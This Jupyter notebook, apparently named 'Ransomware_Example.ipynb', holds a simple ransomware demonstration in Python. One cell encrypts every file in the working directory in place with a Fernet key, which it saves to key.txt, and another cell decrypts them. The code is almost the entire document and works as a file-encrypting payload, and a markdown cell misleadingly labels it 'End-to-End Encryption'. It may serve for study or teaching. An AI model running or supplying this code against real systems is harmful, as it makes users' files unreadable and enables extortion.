{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "3ec1de38",
   "metadata": {},
   "outputs": [],
   "source": [
    "from cryptography.fernet import Fernet\n",
    "import os"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "49c04c4a",
   "metadata": {},
   "source": [
    "**End-to-End** Encryption"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "id": "2804658d",
   "metadata": {},
   "outputs": [],
   "source": [
    "# os.listdir()\n",
    "\n",
    "files = []\n",
    "for file in os.listdir():\n",
    "    if file == \"Ransomware_Example.ipynb\" or file == \".ipynb_checkpoints\" or file == \"key.txt\":\n",
    "        continue\n",
    "    if os.path.isfile(file):\n",
    "        files.append(file)\n",
    "\n",
    "#key = Fernet.generate_key()\n",
    "\n",
    "with open(\"key.txt\", \"wb\") as myfile:\n",
    "    myfile.write(key)\n",
    "    \n",
    "for file in files:\n",
    "    with open(file, \"rb\") as myfile:\n",
    "        content = myfile.read()  \n",
    "    encrypted_content = Fernet(key).encrypt(content)\n",
    "    #print(encrypted_content)\n",
    "    with open(file, \"wb\") as myfile:\n",
    "        myfile.write(encrypted_content)\n",
    "\n",
    "\n",
    "        \n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "id": "98a2077b",
   "metadata": {},
   "outputs": [],
   "source": [
    "for file in files:\n",
    "    with open(file, \"rb\") as myfile:\n",
    "        content = myfile.read()\n",
    "    decrypted_content = Fernet(key).decrypt(content)\n",
    "    with open(file, \"wb\") as myfile:\n",
    "        myfile.write(decrypted_content)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1f78ca38",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
